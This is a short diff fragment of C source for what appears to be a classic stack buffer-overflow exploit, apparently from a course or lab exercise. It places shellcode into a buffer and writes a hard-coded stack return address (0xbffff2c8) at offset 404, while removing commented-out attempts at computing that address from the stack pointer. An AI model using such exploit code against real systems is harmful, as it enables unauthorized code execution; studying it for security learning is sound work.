@@ -29,27 +29,7 @@ int main(void)
   memcpy(buffer + 203, shellcode, sizeof(shellcode)-1); // There's a 0 byte at the end of this?!?!
   printf("Size of shellcode: %d\n", sizeof(shellcode));
 
-  // TODO: Copy a bunch of stack pointer address
-  unsigned long sp = get_sp();
-  unsigned long target = sp - 768; // 0x300 is 768 in decimal
-  printf("Stack pointer (ESP): 0x%x\n", sp);
-  printf("Stack pointer - 0x300: 0x%x\n", target);
-
-  // What does memsetting buffer with stack pointer target look like?
-  // memset(&buffer, target, 399); // this is wrong
-  // buffer[407] = 191; // 0xbf
-  // buffer[406] = 255; // 0xff
-  // buffer[405] = 242; // 0xf2
-  // buffer[404] = 200; // 0xc8
-  // char addr[] = "\xc8\xf2\xff\xbf";
-  // addr[3] = 0xbf;
-  // addr[2] = 0xff;
-  // addr[1] = 0xf2;
-  // addr[0] = 0xc8;
-  // memcpy(buffer + 400, addr, sizeof(addr));
-  // memset(buffer + 1024, 0x90, sizeof(addr));
   memcpy(buffer+404, addr, sizeof(addr)-1);
-  // memcpy(buffer+380, shellcode, sizeof(shellcode));
   printf("Size of addr: %d\n", sizeof(addr));
 
   // Print out buffer for testing
